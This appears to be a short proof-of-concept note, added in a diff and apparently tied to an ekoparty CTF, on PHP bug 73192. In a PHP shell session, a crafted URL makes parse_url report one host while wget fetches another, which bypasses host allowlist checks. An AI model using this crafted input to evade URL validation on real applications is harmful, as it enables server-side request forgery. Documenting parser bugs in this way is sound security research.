@@ -1,0 +1,26 @@
+# parse URL Bug in PHP
+#https://bugs.php.net/bug.php?id=73192
+
+php > $url='http://google.com:80?@ctf.ekoparty.org/';
+php > $pu = parse_url($url);
+php > print $pu["host"];
+ctf.ekoparty.org
+php > $url = escapeshellarg($url);
+php > print $url;
+'http://google.com:80?@ctf.ekoparty.org/'
+php > exec("wget $url", $output);
+--2016-10-28 15:50:35--  http://google.com/?@ctf.ekoparty.org/
+Resolving google.com (google.com)... 216.58.195.238, 2607:f8b0:4005:807::200e
+Connecting to google.com (google.com)|216.58.195.238|:80... connected.
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: http://www.google.com/?@ctf.ekoparty.org/= [following]
+--2016-10-28 15:50:35--  http://www.google.com/?@ctf.ekoparty.org/=
+Resolving www.google.com (www.google.com)... 216.58.192.4, 2607:f8b0:4005:801::2004
+Connecting to www.google.com (www.google.com)|216.58.192.4|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/html]
+Saving to: `index.html?@ctf.ekoparty.org%2F'
+
+    [ <=>                                                                                                                                                                ] 10,391      --.-K/s   in 0.008s  
+
+2016-10-28 15:50:36 (1.26 MB/s) - `index.html?@ctf.ekoparty.org%2F' saved [10391]
